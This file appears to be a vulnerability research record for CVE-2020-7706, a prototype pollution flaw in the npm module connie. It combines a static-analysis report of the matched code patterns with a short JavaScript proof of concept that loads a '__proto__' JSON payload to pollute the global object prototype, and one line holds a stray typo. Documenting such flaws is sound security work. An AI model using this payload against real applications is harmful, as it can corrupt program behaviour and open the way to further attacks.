// Module Name : connie
// Version : 0.2.1
// CVE number : CVE-2020-7706
// CVSS score : 9.8 (CVSS 3.0)
// Published Date : 19 Aug, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 15539
[+] Total Time(ms) : 7140
[+] Analysis Time(ms) : 237
[+] Detected AST Pattern 1 : 1 
[+] Detected AST Pattern 2 : 1
SCC generation complete
 
**********Prototype Pollution v2 found!**********
[ 7649, 7672 ] current = current [ key ]
[ 7683, 7728 ] current [ undefined ]= value
*/

// Prototype pollution source code patterns detected
/*
function setKey(obj: any, keyPath: string[], value: any) {
	...
	current = current[key]                          //AST Pattern 1
	...
	current[keyPath[keyPath.length - 1]] = value    //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7706
const connie = require('connie')z
const fs = require('fs')
fs.writeFileSync('test.json', `{"__proto__": {"polluted": true}}`)
connie('dir', '.').read().then(x => {
	console.log(polluted) //true
})